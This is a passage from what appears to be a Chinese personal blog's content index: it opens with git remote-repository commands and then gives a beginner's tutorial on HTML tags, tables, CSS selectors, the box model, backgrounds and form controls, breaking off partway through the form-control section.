--删除版本库永久存放区的指定文件远程版本库操作命令：# git remote --查看当前版本库已经添加的所有远程版本库# git remote -v --长格式查看所有添加的远程版本库# git remote add [版本库名称] [链接地址] --添加一个远程版本库# git remote remove [版本库名称] --删除一个远程版本库# git push -u [版本库名称] [分支名称] --将本地版本库内容推送到指定远程版本库# git clone [版本库链接地址] --克隆(下载)一个远程版本库的内容到本地","link":"/2020/08/03/git/"},{"title":"html和css基础","text":"一、HTML5基础1，基本结构 1234567891011121314151617&lt;!DOCTYPE html&gt; #表示文档的类型，html类型&lt;html&gt; &lt;head&gt; #网页头部 &lt;meta charset=&quot;utf-8&quot; /&gt; # 网页字符编码 &lt;title&gt;第一个页面&lt;/title&gt; &lt;/head&gt; &lt;body&gt; #主体部分 yichen is a good man &lt;/body&gt;&lt;/html&gt;&lt;html&gt;....&lt;/html&gt;标签标记着html文档的开始和结束 &lt;meta/&gt;标签 定义其他的说明&lt;meta name=&quot;keywords&quot; content=&quot;逸尘秀&quot;/&gt; #内容描述&lt;meta name=&quot;description&quot; content=&quot;分享日常工作笔记&quot;/&gt; 2，基本语法1、 &lt;常规标签&gt;1&lt;标签 属性= &quot;属性值&quot; 属性=&quot;属性值&quot;&gt;&lt;/标记&gt; 2、空标签123456 &lt;标签 属性=&quot;属性值&quot;/&gt;说明: 1.写在&lt;&gt;中的第一个单词叫做标记，标签，元素。这3个名字都是指的一个 2.标记和属性用空格隔开，属性和属性值用等号连接，属性值必须放在&quot;&quot;号内。 3.一个标记可以没有属性也可以有多个属性，属性和属性之间不分先后顺序。 4.空标签没有结束标签，用&quot;/&quot;代替。 3，网页基本标签1, 注释标签1ctrl + / &lt;!--注释 --&gt; 2，标题标签&lt;h1-6&gt;123456&lt;h1&gt;.....&lt;/h1&gt; &lt;h1&gt;一级标题&lt;/h1&gt;&lt;h2&gt;.....&lt;/h2&gt; &lt;h2&gt;二级标题&lt;/h2&gt;&lt;h3&gt;.....&lt;/h3&gt; &lt;h3&gt;三级标题&lt;/h3&gt;&lt;h4&gt;.....&lt;/h4&gt; &lt;h4&gt;四级标题&lt;/h4&gt;&lt;h5&gt;......&lt;/h5&gt; &lt;h5&gt;五级标题&lt;/h5&gt;&lt;h6&gt;......&lt;/h6&gt; &lt;h6&gt;六级标题&lt;/h6&gt; 3，换行标签&lt;br /&gt;12&lt;!-- 换行标签 --&gt; 当今世界正处于百年未有之大变局”，&lt;br /&gt;习近平总书记的这一重大论断再次得到印证。人类21世纪的第三个十年，启幕之时因为新冠疫情被摁下“暂停键”。 4, 段落标签 &lt;p&gt;段落标签&lt;/p&gt;1文章的段落一般用&lt;p&gt;标签包起来 5，水平线标签&lt;hr/&gt;1显示效果就是一条水平线 6，字体样式标签&lt;strong&gt;1234567&lt;strong&gt;yichen is a good man &lt;/strong&gt;&lt;br /&gt; &lt;!--加粗--&gt;&lt;b&gt;yichen is a nice man &lt;/b&gt; &lt;!--加粗，语气加强 --&gt; &lt;!-- 倾斜 --&gt;&lt;em&gt;yichen is a good man&lt;/em&gt; &lt;br&gt;&lt;i&gt;yichen is a cool man&lt;/i&gt; 7，特殊符号&amp;nbsp 空格符1234567&lt;!-- 特殊符号 --&gt;&lt;p&gt;yichen&amp;nbsp &amp;nbsp is a nice man&lt;/p&gt; &lt;!--空格符 --&gt;&lt;p&gt;&gt;&lt;/p&gt; &lt;!--&amp;gt大于符号 &gt; --&gt;&lt;p&gt;&lt;&lt;/p&gt; &lt;!--&amp;lt小于符号 &lt; --&gt;&lt;p&gt;&quot;&lt;/p&gt; &lt;!--&amp;quot引号 &quot; --&gt;&lt;p&gt;&amp;copy;&lt;/p&gt; &lt;!--&amp;copy版权符号 © --&gt; 8，图像标签&lt;img&gt;1234常见的格式 jpg gif png bmp &lt;!-- src=&quot;图片的路径&quot; alt=&quot;图像的替代文字&quot; title=&quot;鼠标悬停提示文字&quot; width=&quot;图片宽度&quot; height=&quot;图片高度&quot; --&gt; &lt;img src=&quot;img/ding17.gif&quot; alt=&quot;背景图&quot; title=&quot;大背景图&quot; width=&quot;160&quot; height=&quot;160&quot; /&gt; 9,链接标签&lt;a href=””&gt;1234567891011121.&lt;!-- 链接标签 --&gt; &lt;hr/&gt; _self在本窗口打开，_blank新窗口打开 &lt;!--href=&quot;链接路径&quot; target=&quot;目标窗口位置&quot;,常用值_self,_blank --&gt; &lt;a href=&quot;https://yichenxiu.com&quot; target=&quot;_blank&quot;&gt;逸尘秀&lt;/a&gt; &lt;!--链接图片也可以--&gt; &lt;a href=&quot;img/ding9.jpg&quot; target=&quot;_blank&quot;&gt;背景图&lt;/a&gt; &lt;!-- 在链接标签内部还可以链接图片标签 --&gt; &lt;a href=&quot;https://yichenxiu.com&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;img/ding9.jpg&quot; width=&quot;160&quot; height=&quot;160&quot; &gt;&lt;/a&gt;2.锚点 &lt;a href=&quot;#mao1&quot;&gt;跳转锚点&lt;/a&gt; &lt;!-- 锚点 --&gt; &lt;a name=&quot;mao1&quot;&gt;这是锚点&lt;/a&gt; 10.列表&lt;ul&gt;&lt;li&gt;1234567891011121314151617181920212223242526272829303132333435363738394041列表的分类： 无序列表 有序列表 定义列表 &lt;!-- 无序列表 --&gt; &lt;ul&gt; &lt;li type=&quot;disc&quot;&gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt;逸尘秀1&lt;/a&gt;&lt;/li&gt; &lt;li type=&quot;square&quot;&gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt;逸尘秀2&lt;/a&gt;&lt;/li&gt; &lt;li type=&quot;circle&quot;&gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt;逸尘秀3&lt;/a&gt;&lt;/li&gt; &lt;li type=&quot;circle&quot;&gt; yichen is a good man &lt;/li&gt; &lt;/ul&gt; &lt;ul type=&quot;square&quot;&gt; &lt;li &gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt;逸尘秀1&lt;/a&gt;&lt;/li&gt; &lt;li &gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt;逸尘秀2&lt;/a&gt;&lt;/li&gt; &lt;li &gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt;逸尘秀3&lt;/a&gt;&lt;/li&gt; &lt;li &gt; yichen is a good man &lt;/li&gt; &lt;/ul&gt;无序列表的类型disc 项目符号显示为实体圆心，默认值square 项目符号显示为实体方心circle 项目符号显示为空心圆&lt;!-- 有序列表 --&gt; &lt;ol type=&quot;A&quot;&gt; &lt;li &gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt;逸尘秀1&lt;/a&gt;&lt;/li&gt; &lt;li &gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt;逸尘秀2&lt;/a&gt;&lt;/li&gt; &lt;li &gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt;逸尘秀3&lt;/a&gt;&lt;/li&gt; &lt;li &gt; yichen is a good man &lt;/li&gt; &lt;/ol&gt;有序列表的类型1 使用数字作为项目符号A/a 使用大写/小写字母作为项目符号I/i 使用大写/小写罗马数字作为项目符号&lt;!-- 定义列表 --&gt; &lt;dl&gt; &lt;dt&gt;学院1&lt;/dt&gt; &lt;dd&gt;电子信息工程1&lt;/dd&gt; &lt;dd&gt;电子信息工程111&lt;/dd&gt; &lt;dt&gt;学院2&lt;/dt&gt; &lt;dd&gt;电子信息工程2&lt;/dd&gt; &lt;/dl&gt; dl 声明定义列表 dt声明的列表项 标题 dd 表示定义列表项内容 4, 表格1.表格的基本语法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;table align=&quot;center&quot;&gt; 表格标签&lt;table align=&quot;center&quot; border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;头部&lt;/th&gt; #th代表头部 &lt;th&gt;姓名&lt;/th&gt; &lt;th&gt;学生&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; 行标签 &lt;td&gt;第1行第一列&lt;/td&gt; 单元格标签 &lt;td&gt;第1行第二列&lt;/td&gt; &lt;td&gt;第1行第三列&lt;/td&gt; &lt;/tr&gt; 第2行 &lt;tr&gt; &lt;td&gt;第2行第一列&lt;/td&gt; &lt;td&gt;第2行第二列&lt;/td&gt; &lt;td&gt;第2行第三列&lt;/td&gt; &lt;/tr&gt; 第3行 &lt;tr&gt; &lt;td&gt;第3行第一列&lt;/td&gt; &lt;td&gt;第3行第二列&lt;/td&gt; &lt;td&gt;第3行第三列&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;tr&gt; 定义表格的行&lt;th&gt; 定义表格的头部 需要被&lt;tr&gt;包裹&lt;td&gt; 定义表格的单元，需要被&lt;tr&gt;包裹 &lt;thead&gt; 定义表格的页眉，表格分组标签，可将表格分割&lt;tfoot&gt; 定义表格的页脚，表格分组标签，可将表格分割&lt;tbody&gt; 定义表格的主体，表格分组标签，可将表格分割如果你使用thead,tfoot以及tbody元素，你就必须使用全部的元素，他们的出现次序是: thead、tfoot、tbody,这样浏览器就可以收获所有的数据&lt;caption&gt; 定义表格标题对齐方式表格对齐方式 默认对齐、居中对齐、左对齐、右对齐单元格对齐方式 水平对齐方式、垂直对齐方式 属性 值 说明 left 左对齐 center 居中对齐align right 右对齐水平对齐方式 top 顶端对齐vailgn middle 居中对齐垂直对齐方式 bottom 底端对齐 baseline 基线对齐 border=&quot;2&quot; 代表行与行之间的间距，数字越大间距越宽cellspacing=&quot;4&quot; 单元表格之间的空白cellpadding=&quot;3&quot; 代表文字与表格的间距，数字越大间距越宽colspan =&quot;value&quot; 合拼列rowspan =&quot;value&quot; 合并行 2，表格的跨行和跨列123456789101112131415161718192021&lt;table&gt; &lt;tr&gt; 行 &lt;td colspan=&quot;2&quot;&gt;第一行第一列&lt;/td&gt; 2代表占用2列 &lt;td&gt;第一行第二列&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;第二行第一列&lt;/td&gt; &lt;td&gt;第二行第二列&lt;/td&gt; &lt;td rowspan=&quot;2&quot;&gt;第二行第三列&lt;/td&gt; 2代表2行 &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;第三行第一列&lt;/td&gt; &lt;td&gt;第三行第二列&lt;/td&gt; &lt;!-- &lt;td&gt;第三行第三列&lt;/td&gt; --&gt; &lt;/tr&gt;&lt;/table&gt;colspan =&quot;value&quot; 合拼列rowspan =&quot;value&quot; 合并行 二、CSS基础1，css简介123CSS：Cascaang Style Sheets 层叠样式表，WEB标准中表现标准语言，主要对网页信息的显示进行控制(修饰网页信息的显示样式)css1 1996年 css2 1998年 css2.1 2004年 css3.0 2010年 2，CSS样式1231, 内部样式表2, 外部样式表3,内联样式表(行内样式、嵌入式样式) 1，内部样式表123456语法：&lt;style type=&quot;text/css&quot;&gt; /* CSS语句 */ &lt;/style&gt; #注意：使用style标签创建样式时，最好将标记写在&lt;heas&gt; &lt;/head&gt;;之间 2，外部样式表1234567891011121314151617(1),创建外部样式表创建css目录，新建文件： xxx.css@charset &quot;utf-8&quot;; 头一行这样写，现在也可以不用写了，默认的就是utf-8(2),导入外部样式表方法1：&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/style.css&gt; &lt;!-- herf=&quot;&quot;后面填写目标文件路径及文件名全称 --&gt;说明：使用link标签导入外部样式表时，需要将该元素写在文档的头部，即&lt;head&gt;与&lt;/head&gt;中方法2: 现在很少用这种方法了&lt;style type=&quot;text/css&quot;&gt; @import url(&quot;./css/style.css&quot;); &lt;/style&gt;说明: @和import之间没有空格, url和小括号之间也没有空格；必须结尾以分号结束; 3，内联样式表(行内样式)12345语法：&lt;标签 style=&quot;属性: 属性值 属性: 属性值&quot;&gt; &lt;/标签&gt;或者:&lt;标签 style=&quot;属性: 属性值 属性: 属性值&quot;/&gt;&lt;p style=&quot;color: blue;&quot;&gt;yichen is a nice man &lt;/p&gt; 4,样式的优先级123456789内联(行内)样式表优先级别最高内部样式表与外部样式表的优先级和书写的顺序有关，后书写的优先级别高 &lt;!-- css内部样式 --&gt; &lt;style type=&quot;text/css&quot;&gt; /* CSS语句 */ &lt;/style&gt; &lt;!-- css外部样式调用 --&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/style.css&quot;/&gt; 这个在后面，优先级就比前面的高， 3，CSS语法0，CSS盒子模型所有HTML元素可以看作盒子，在CSS中，”box model”这一术语是用来设计和布局时使用。 CSS盒模型本质上是一个盒子，封装周围的HTML元素，它包括：边距，边框，填充，和实际内容。 盒模型允许我们在其它元素和周围元素边框之间的空间放置元素。 下面的图片说明了盒子模型(Box Model)： 不同部分的说明： Margin(外边距) - 清除边框外的区域，外边距是透明的。 Border(边框) - 围绕在内边距和内容外的边框。 Padding(内边距) - 清除内容周围的区域，内边距是透明的。 Content(内容) - 盒子的内容，显示文本和图像。 为了正确设置元素在所有浏览器中的宽度和高度，你需要知道的盒模型是如何工作的。 元素的宽度和高度 重要: 当您指定一个 CSS 元素的宽度和高度属性时，你只是设置内容区域的宽度和高度。要知道，完整大小的元素，你还必须添加内边距，边框和边距。 下面的例子中的元素的总宽度为300px： 实例 123456div { width: 300px; border: 25px solid green; padding: 25px; margin: 25px;} 让我们自己算算：300px (宽)+ 50px (左 + 右填充)+ 50px (左 + 右边框)+ 50px (左 + 右边距)= 450px 最终元素的总宽度计算公式是这样的： 总元素的宽度=宽度+左填充+右填充+左边框+右边框+左边距+右边距 元素的总高度最终计算公式是这样的： 总元素的高度=高度+顶部填充+底部填充+上边框+下边框+上边距+下边距 1,语法12345678910语法： selector {property:value;property:value;} selector表示选择器 property表示声明(属性和值) 说明: (1)每个css样式由3个部分组成， 选择器，属性 和值。 (2)属性必须放在{}花括号中，属性和属性值用冒号连接。 (3)每条声明用;分号结束。 (4)当一个属性有多个属性值的时候，属性值与属性值不分先后顺序。 (5)在书写样式过程中，空格，换行等操作不影响属性显示 2，简单属性的使用其他属性参考css属性汇总 12345678910111. color: 颜色 规定颜色值为颜色单词名称列如(red)或者十六进制的颜色列如(#ff0000)或者为rgb值的颜色列如(red(255,0,0))2. width: 宽度 设置标签的宽度值，值为数字:单位为px(像素)、em(字符)、%(百分比);默认值为auto(自动，通过浏览器自动计算出宽度值单位为像素) 像素在浏览器中的概念: 像素数决定标签或文字在浏览器中显示的大小或位置，页面中的最小计量单位为1px，即1一个像素，3. height: 高度 设置标签的宽度值，值为数字:单位为px(像素)、em(字符)、%(百分比);默认值为auto(自动，通过浏览器自动计算出宽度值单位为像素)4. background-color: 背景颜色 背景颜色:规定背景颜色值为单词的名称列如(red)或者十六进制的颜色列如(#ff0000)或者为rgb值的颜色列如(red(255,0,0))。 可以为所有的标签设置背景色，这包括 body 一直到em和a等行内标签。 4，标签(元素)分类1234标签从表面上分为单标签和双标签，单标签功能单一，不能嵌套，双标签功能多样化，可以嵌套。标签又分为块级元素和内联元素(行内元素),(1) 块级元素(block-levelelements) p标签，div标签，独占一行或几行(2) 内联元素(行内元素、inlineelements)(3) 内联块级元素(inline-block) 1，块级元素123456789101112131.块级元素在网页中就是(元素显示为矩形区域)的形式显示。 常用的块元素: div、dl、dt、dd、ol、ul、li、fieldset、(h1-h6)、p、form、hr、colgroup、col、table、 tr、td等。 2.默认情况，块状元素都会占一行，通俗的说，两个相邻的块元素不会出现并列显示的现象；默认情况下，块状元素会按照顺序自上而下排列。3. 块状元素都可以定义自己的宽度和高度，不设置宽度的时候，默认与父级元素一样宽。4.块状元素一般都作为其他元素的容器，他可以容纳其他内联元素和其他块元素，我们可以把这种容器比喻为一个盒子。&lt;p&gt;为段落标签，一般能用于装载段落文字，并且&lt;p&gt;标签中不可以包含块级标签。h1-h6&lt;div&gt;为最常用的结构标签，常能用于分割页面区域，以及功能模块。 (1)，块级元素汇总块级元素有： address - 地址 blockquote - 块引用 center - 举中对齐块 dir - 目录列表 div - 常用块级容易，也是 css layout 的主要标签 dl - 定义列表 fieldset - form控制组 form - 交互表单 h1-大标题 h4 - 副标题 h3 - 3级标题 h4 - 4级标题 h5 - 5级标题 h6 - 6级标题 hr - 水平分隔线 isindex - input prompt menu - 菜单列表 noframes - frames可选内容，（对于不支持 frame 的浏览器显示此区块内容 noscript - ）可选脚本内容（对于不支持 script 的浏览器显示此内容） ol - 排序表单 p - 段落 pre - 格式化文本 table - 表格 ul - 非排序列表 2，内联元素(行内元素)12345671.行内元素（内联元素）具有以下特点：和其他元素都在一行上，直到一行排不下才会换行，宽度随元素内容变化；高，行高及外边距和内边距不可改变；（设置宽度width无效，高度height无效，但可以设置line-height,设置margin只有左右有效，上下无效，设置padding左右有效，上下无效)宽度就是他的文字或图片的宽度，不可改变；内联元素只能容纳文本或者其他内联元素；行内元素大多为描述性标记； (1),内联元素汇总行内元素有： a - 锚点 abbr - 缩写 acronym - 首字 b - 粗体 ( 不推荐 ) bdo - bidi override big - 大字体 br - 换行 cite - 引用 code - 计算机代码 ( 在引用源码的时候需要 ) dfn - 定义字段 em - 强调 font - 字体设定 ( 不推荐 ) i - 斜体 img - 图片 input - 输入框 kbd - 定义键盘文本 label - 表格标签 q - 短引用 s - 中划线 ( 不推荐 ) samp - 定义范例计算机代码 select - 项目选择 small - 小字体文本 span - 常用内联容器，定义文本内区块 strike - 中划线 strong - 粗体强调 sub - 下标 sup - 上标 textarea - 多行文本输入框 tt - 电传文本 u - 下划线 var - 定义变量 3，内联块级元素123451、内联块(行内块)级元素是块级元素和内联元素的混合体，inline-block元素设置宽度和高度，2、内联快级元素属于内联元素，不会独占一行，而是会和其他inline元素和inline-block元素在同一行按左至右的顺序显示3、常见的内联块级元素: img、textarea、input、select、iframe等。内联块级元素的使用场合: 导航菜单 4,元素类型转换12345display 属性display: none; -- 让标签消失(隐藏元素并脱离文档流)display: inline; -- 内联元素(内联表签)元素前后没有换行符display: block; -- 块级元素(块级标签)display: inline-block; -- 既有inline的属性也有block属性 5,行内块级元素案例 导航栏12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;导航栏&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; li{ display: inline-block; width: 100px; height: 30px; background-color: #ff8888; font: 12px; /*设置字体的大小*/ text-align: center; /*设置字体对齐方式*/ line-height: 30px;/* 等于li的高度，可以让字体垂直居中*/ } a{ color: cornsilk; text-decoration: none; /*去线*/ } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;https://www.yichenxiu.com&quot;&gt; 导航1&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;https://yichenxiu.com&quot;&gt; 导航2&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt; 导航3&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt; 导航4&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt; 导航5&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt; 导航6&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt; 导航7&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt; 导航8&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt;&lt;/html&gt; 下面是显示效果: 5,页面布局123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot; /&gt; &lt;title&gt;页面布局&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; /* *表示通配 */ *{ padding: 0; margin: 0; } #box{ width: 700px; /* background-color: red; */ margin: 0 auto; } #logo1{ height: 100px; background-color: yellow; } #nav{ height: 26px; background-color: red; } #main{ height: 600px; } /* #leftMain{ display: inline-block; width: 350px; height: 600px; background-color: blue; } #rifhtMain{ display: inline-block; width: 350px; height: 600px; float: right; 不写这个也行，但是左右div的宽度加起来不能刚好等于700px background-color: pink; } */ #leftMain{ display: inline-block; width: 350px; height: 600px; background-color: blue; } #rifhtMain{ display: inline-block; width: 345px; height: 600px; /* float: right; */ background-color: pink; } #footer{ height: 43px; background-color: deeppink; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- box --&gt; &lt;div id=&quot;box&quot;&gt; &lt;!-- logo部分 --&gt; &lt;div id=&quot;logo1&quot;&gt; &lt;/div&gt; &lt;!-- nav导航 --&gt; &lt;div id=&quot;nav&quot;&gt; &lt;/div&gt; &lt;!-- 广告 --&gt; &lt;div id=&quot;guanggao&quot;&gt; &lt;/div&gt; &lt;!-- 主体 --&gt; &lt;div id=&quot;main&quot;&gt; &lt;div id=&quot;leftMain&quot;&gt; &lt;/div&gt; &lt;div id=&quot;rifhtMain&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- 底部 --&gt; &lt;div id=&quot;footer&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 6,注释1234567html注释&lt;!--注释内容--&gt;css注释/*注释内容*/ 三、选择器的运用1、css选择器12345678910常用的:(1)、元素选择器/标签选择器(element选择器)(2)、id选择器(3)、class选择器(4)、*通配符(全局选择器)(5)、交集选择器(6)、并级选择器(群组选择器)(7)、后代选择器(包含选择器)(8)、子选择器(9)、伪类选择器 1,标签选择器 123456789101112131415语法： 元素(标签)名称{属性: 属性值; 属性2: 属性值; } 列如: p{ cocor: red; background-color: pink; }说明: (1)标签选择器:以文档语言对象类型作为选择器，即使用结构中元素名称作为选择器，列如 body、div、p、img、em、strong、span等等 (2)所有的页面元素都可以作为选择器用法: (1)如果想改变某个元素的默认样式时，可以使用元素选择器 (2)统一文档的某个元素显示效果是，可以使用元素选择器 2，id选择器 123456789101112语法: #id名{ 属性: 属性值; 属性2: 属性值; } 说明: (1)使用id选择器时，应该为元素定义id属性，如&lt;div id=&quot;top&quot;&gt; &lt;/div&gt;。 (2)id选择器的语法格式:&quot;#&quot;加上自定义的is名称。 (3)id名命名取英文名,不能使用关键字(所有的标记和属性都是关键字)如:head、body等标记。 (4)一个id名称只能对应文档中的一个具体的元素对象。因为id只能定义页面中的某一个唯一的元素对象。 (5)id选择器最大的用处:创建网页的外围结构。 3,class选择器 123456789101112131415161718语法:.class类名{ 属性: 属性值; 属性2: 属性值; }说明: (1)使用类选择器是，应该先为每一个元素定义一个类名称。 (2)类选择器的语法格式是: &lt;div class=&quot;top&quot;&gt; &lt;/div&gt; .top{ width: 200px; height: 500px; }用法: class选择器更适合定义一类样式注意: 类名的第一个字符不能使用数字。它无法再Mozila或Firefox浏览器中起作用 *4，通配符(全局选择器)** 12345678910111213语法: *{ 属性: 属性值; 属性2: 属性值; }说明: 通配符的写法是&quot;*&quot;,其含义就是所有元素/标签。 用法: 常用来重置样式示例: *{padding:0px ; margin: 0} #0可以不用写px。 5，交集选择器 1234567891011121314151617181920语法:选择器1选择器2{ 属性: 属性值; 属性2: 属性值;}说明: 用于选择同时有多个选择器匹配的元素 第一种格式类似于: h1.center{ color: red; text-align:center; } 这种格式有标签选择器和类选择器组成。 第二种格式类似于: h1#center{ color:red; text-align:center; }两个选择器之间不能有空格，必须连续书写。以上两种格式组成的选择器，也就是前者所定义的标签类型和后者的类或者id的元素，称之为交集选择器 6,并集选择器 1234567语法: 选择器1,选择器2,选择器3{ 属性: 属性值; 属性2: 属性值; }说明:当有多个选择器应用同样的样式时，可以将选择器用&quot;,&quot; 分隔，合并为一组。 7,后代选择器 1234567语法: 选择器1 选择器2{ 属性: 属性值; 属性2: 属性值; }说明: 选择器1和选择器2用空格隔开，含义就是选择器1中包含的所有选择器2; 8,子选择器 1234567语法:选择器1&gt;选择器2{ 属性: 属性值; 属性2: 属性值; }说明: 选择器1和选择器2用&gt;连接，含义就是选择器1中的所有子一级选择器2 9,伪类选择器 12345678910111213语法:a:link{color: red;} 超链接的初始状态；没有被访问过的超链接a:visited{color: yellow;} 超链接被访问后的状态；a:hover{color:blue;} 鼠标划过超链接时的状态；a:active{color: pink;} 超链接激活时的状态，即鼠标按下时超链接的状态；说明: (1) 当这4个超链接伪类选择器联合使用时，应注意他们的顺序，正常的顺序为: a:link、a:visited、a:hover、a:active;错误的顺序有时会使超链接的样式失效; (2) 为了简化代码，可以把伪类选择符中相同声明提出来放在a选择符中； 例如: a{color:red;} a:hover{color:green;} 表示超链接的三种状态相同，只有鼠标划过时变颜色。 2、选择器的权重1234567891011121314151617说明:在CSS中，会根据选择器的特殊性来觉定所定义的样式规则次序，具有更特殊的选择器的规则优先于具有一般选择器的规则，如果两个规则的特殊性相同，那么后定义的规则优先。CSS中用四位数字表示权重，权重的表达方式为如: 0,0,0,0, 元素选择器/标签选择器的权重为0001 class选择器的权重为0010 id选择器的权重为0100 #这个权重比上面两个高 属性选择器的权重为0010 伪类选择器的权重为0010 伪元素选择器的权重为0010 包含选择器的权重:为包含选择器的权重之和 子选择器的权重为0000 群组选择器的权重为0000 继承样式的权重为0000 行内样式的权重为1000 #这个权重最高比较时从高位到低位(A到D)分别比较，高位相同才需要比较低位 3、css3新增的选择器12341、属性选择器2、结构伪类选择器3、UI伪类选择器4、其他选择器(兄弟元素选择器、否定伪类选择器、目标伪类选择器) 四、列表1、列表css声明CSS列表属性允许你放置、改变列表项标志，或者将图像作为列表项标志 属性 描述 list-style 简写属性。用于把所有用于列表的属性设置于一个声明中 list-style-image 将图像设置为列表项标志。 list-style-position 设置列表中列表项标志的位置。 list-style-type 设置列表项标志的类型。 12345678&lt;style type=&quot;text/css&quot;&gt; li{ /* list-style: none url(img/favicon.ico) inside; */ 这种写法更简单 list-style: none; list-style-image: url(img/favicon.ico); list-style-position: inside; } &lt;/style&gt; 1.1 定义列表符号样式 1234567891011121314151617通过取不同的list-style-type属性值，我们可以得到不同的项目符号。例：ul { list-style-type:disc;} /*实心圆*/ ul { list-style-type:circle;} /*空心圆*/ ul { list-style-type:square;} /*实心方块*/ ul { list-style-type:none;} /*不显示项目符号*/ ol { list-style-type:decimal;} /*阿拉伯数字*/ ol { list-style-type:lower-roman;} /*小写罗马数字*/ ol { list-style-type:upper-alpha;} /*大写英文字母*/ 2、背景的css声明 属性 描述 CSS background 在一个声明中设置所有的背景属性。 1 background-attachment 设置背景图像是否固定或者随着页面的其余部分滚动。 1 background-color 设置元素的背景颜色。 1 background-image 设置元素的背景图像。 1 background-position 设置背景图像的开始位置。 1 background-repeat 设置是否及如何重复背景图像。 1 background-clip 规定背景的绘制区域。 3 background-origin 规定背景图片的定位区域。 3 background-size 规定背景图片的尺寸。 3 1234567891011121314151617181920212223242526272829303132333435363738394041421. 背景颜色语法: 选择器{background-color: 颜色值;} 2. 背景图片语法: 选择器{background-image: url(图片的路径及全称);}说明: 网页上图片有两种形式。也就是结构 背景图:属于网页的表现，背景图上可以显示文字，插入图片，表格等， 3. 背景图片的显示原则和平铺属性背景图片显示原则:(1) 容器尺寸等于图片尺寸，背景图片正好显示在容器中;(2) 容器尺寸大于图片尺寸，背景图片将默认平铺，直到铺满元素;(3) 容器尺寸小于图片尺寸，只显示元素范围内的背景图;语法: 选择器{ background-repeat:no-repeat|repeat|repeat-x|repeat-y; } no-repeat 不平铺 repeat 平铺 repeat-x 横向平铺 repeat-y 纵向平铺 4.背景图片的固定语法: 选择器{ background-attachment: fixed;} fixed inherit initial scroll unset local 这些是属性值，很少用 5.设置背景图像的开始位置。 选择器{background-position} 值有 水平方向上的对齐方式(left/center/rifht) 垂直方向的对齐方式(top/center/bottom) 3、内容的显示和隐藏(1),display:none 隐藏元素，该方式隐藏在页面不占位 (2), visibility: hidden,隐藏元素，改方式隐藏的元素在页面中占位 (3),border-radius: 100px; 以多少半径话圆 五、文本属性1、文本css声明1234567891011121,文本样式的font属性文本大小:font-size文本字体:font-family文本粗细:font-weight文本倾斜: font-style文本行高: line-height文字属性font简写2,文本样式的text属性3,文本样式修饰的运用规范4，文本添加阴影 六、表单表单作用:收集用户信息 表单组成： ​ 1.表单域 ​ 2.表单控件 ​ 3.提示信息 1，表单域123456789101112131415语法:&lt;form 属性名称=&quot;值&quot;&gt;&lt;/form&gt;常用的属性: 1, name = &quot;值&quot; :规定表单的名称 2, action=&quot;值&quot; :提交表格的url 3, method=&quot;get/post&quot; :提交方式，一般用post 4,enctype = &quot;值&quot; :规定在发送表单数据之前进行的编码 可能的值: &quot;applivation/x-wwww-from-urlercoded&quot; ,&quot;mutpart/from-data&quot;, &quot;text/plain&quot; 5,target=&quot;_black/_self/_parent/_top&quot; 打开表单URL H5新增属性 1, autoconmplete = &quot;on/off&quot; :是否启动表单自动完成 2, novalidate = &quot;novalidate&quot; 不验证表单 2，表单控件123456789101112131415161718192021222324252627282930313233343536371,文本框 &lt;input type=&quot;text&quot; value=&quot;默认值&quot;&gt; 2,密码框 &lt;input type=&quot;password&quot; placeholder=&quot;密码&quot; /&gt;3,提交按钮 &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt;4, 重置按钮 &lt;input type=&quot;reset&quot; value=&quot;重置&quot;/&gt;5, 单选框/单选按钮&lt;input type=&quot;radio&quot; name=&quot;dan&quot; checked=&quot;checked&quot; value=&quot;power&quot;/&gt; 单选框里面name的值需要一样&lt;input type=&quot;radio&quot; name=&quot;dan&quot; checked=&quot;checked&quot; value=&quot;money&quot; /&gt;6, 按钮 &lt;input type=&quot;button&quot; value=&quot;按钮内容&quot; /&gt;7, 复选框 &lt;!-- 